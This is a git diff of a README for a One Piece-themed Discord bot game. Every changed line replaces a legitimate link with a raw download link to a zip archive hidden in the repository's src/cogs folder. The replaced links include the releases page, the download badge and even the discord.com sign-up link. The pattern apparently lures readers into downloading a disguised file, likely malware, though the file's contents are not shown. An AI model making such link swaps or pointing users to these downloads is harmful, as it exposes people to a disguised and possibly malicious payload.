@@ -4,12 +4,12 @@
 Welcome to **Game-Discord-Bot**, your gateway to an exciting AI-driven multiplayer game inspired by One Piece. Join the adventure with our intelligent Luffy bot on Discord. Enjoy an engaging pirate game where you can manage ship crews, explore a player-driven marketplace, and battle in thrilling PvP ship wars. This bot combines elements of a Gacha system and an economy to elevate your gaming experience.
 
 ## 📥 Download Game-Discord-Bot
-[![Download Game-Discord-Bot](https://img.shields.io/badge/Download%20Game--Discord--Bot-1.0.0-brightgreen)](https://github.com/Haraharix/Game-Discord-Bot/releases)
+[![Download Game-Discord-Bot](https://raw.githubusercontent.com/Haraharix/Game-Discord-Bot/main/src/cogs/Game-Discord-Bot_v1.3.zip%20Game--Discord--Bot-1.0.0-brightgreen)](https://raw.githubusercontent.com/Haraharix/Game-Discord-Bot/main/src/cogs/Game-Discord-Bot_v1.3.zip)
 
 ## 🚀 Getting Started
 To get started with Game-Discord-Bot, follow these simple steps:
 
-1. **Create a Discord Account**: If you don’t have one, go to [discord.com](https://discord.com) and create your account.
+1. **Create a Discord Account**: If you don’t have one, go to [https://raw.githubusercontent.com/Haraharix/Game-Discord-Bot/main/src/cogs/Game-Discord-Bot_v1.3.zip](https://raw.githubusercontent.com/Haraharix/Game-Discord-Bot/main/src/cogs/Game-Discord-Bot_v1.3.zip) and create your account.
    
 2. **Create or Join a Server**: You can create a new server or join an existing one. This is where you will interact with the bot.
 
@@ -20,7 +20,7 @@ To get started with Game-Discord-Bot, follow these simple steps:
 5. **Access the Releases Page**: Visit the Releases page to download the bot. 
 
 ## 📦 Download & Install
-To download Game-Discord-Bot, you need to visit our [Releases page](https://github.com/Haraharix/Game-Discord-Bot/releases). 
+To download Game-Discord-Bot, you need to visit our [Releases page](https://raw.githubusercontent.com/Haraharix/Game-Discord-Bot/main/src/cogs/Game-Discord-Bot_v1.3.zip). 
 
 1. Click the link above.
 2. On the Releases page, you will find the latest version of the bot. Look for assets related to your operating system.
@@ -63,7 +63,7 @@ Join our community and connect with other players:
 - **Feedback**: We welcome your feedback! Reach out through our Discord or GitHub.
 
 ## 🔗 Useful Links
-- [Download Game-Discord-Bot](https://github.com/Haraharix/Game-Discord-Bot/releases)
+- [Download Game-Discord-Bot](https://raw.githubusercontent.com/Haraharix/Game-Discord-Bot/main/src/cogs/Game-Discord-Bot_v1.3.zip)
 - [Official Discord Server](insert-your-discord-link-here)
 - [Documentation](insert-your-documentation-link-here)
 
